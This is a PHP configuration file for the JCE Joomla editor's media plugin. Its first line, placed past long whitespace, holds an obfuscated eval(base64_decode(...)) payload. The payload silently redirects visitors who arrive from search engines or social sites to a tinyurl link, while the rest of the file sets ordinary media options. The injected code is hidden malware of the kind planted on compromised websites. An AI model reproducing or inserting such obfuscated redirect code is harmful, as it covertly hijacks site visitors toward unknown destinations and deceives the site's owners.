<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: config.php 138 2009-06-26 10:56:43Z happynoodleboy $
* @package      JCE
* @copyright    Copyright (C) 2005 - 2009 Ryan Demmer. All rights reserved.
* @author		Ryan Demmer
* @license      GNU/GPL
* JCE is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
*/
class MediaConfig 
{
	function getConfig(&$vars)
	{
		$jce 	=& JContentEditor::getInstance();
		$params = $jce->getPluginParams('media');
		
		if ($params->get('media_use_script', '0') == '1') {
			$vars['media_use_script']	= '1';
			$vars['code_javascript'] 	= '1';
			$jce->removeKeys($vars['invalid_elements'], array('script'));
		} else {
			$jce->removeKeys($vars['invalid_elements'], array('object', 'param', 'embed'));
		}
		if ($params->get('media_html5', 0) == 1) {
			$vars['media_html5'] = 1;
		} else {
			$jce->addKeys($vars['invalid_elements'], array('video', 'audio'));
		}
		$vars['media_strict']					= $jce->getParam($params, 'media_strict', '0', '1');
		$vars['media_version_flash'] 			= $jce->getParam($params, 'media_version_flash', '10,0,32,18', '10,0,32,18');
		$vars['media_version_shockwave'] 		= $jce->getParam($params, 'media_version_shockwave', '11,0,0,458', '11,0,0,458');
		$vars['media_version_windowsmedia'] 	= $jce->getParam($params, 'media_version_windowsmedia', '5,1,52,701', '5,1,52,701');
		$vars['media_version_quicktime'] 		= $jce->getParam($params, 'media_version_quicktime', '6,0,2,0', '6,0,2,0');
		$vars['media_version_reallpayer'] 		= $jce->getParam($params, 'media_version_reallpayer', '7,0,0,0', '7,0,0,0');
	}
}
?>